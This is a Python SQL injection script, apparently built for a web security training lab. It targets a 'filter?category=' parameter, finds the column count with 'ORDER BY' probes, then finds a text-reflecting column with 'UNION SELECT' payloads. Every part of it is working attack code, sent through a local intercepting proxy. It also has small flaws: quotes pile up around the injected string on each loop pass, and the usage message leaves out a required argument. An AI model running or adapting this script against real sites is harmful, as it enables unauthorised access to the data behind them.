import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def expcols(url):
    for i in range(1,10):
        p = "'+order+by+%s--+-" % str(i)
        u = url  + str(i) + p
        r = requests.get(u, verify=False, proxies=proxies)
        print("Try #%s" % str(i))
        if "Internal Server Error" in r.text:
            return i -1
    return False

def textcol(url, num_col, string):
    path = "filter?category=Gifts"
    for i in range(2, num_col+1):
        string = f"'{string}'"
        payload_list = ['null'] * num_col
        payload_list[i-1] = string
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i
    return False

def main():
    try:
        url = sys.argv[1] + "filter?category="
        string = sys.argv[2]
        numcol = expcols(url)
        if numcol:
            print("Cols: %s" % str(numcol))
            textc = textcol(url, numcol, string)
            if textc:
                print("The column that contains text is " + str(textc))
            else:
                print("fail2")
        else:
            print("fail")
    except IndexError:
        print("Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)


if __name__ == '__main__':
    main()
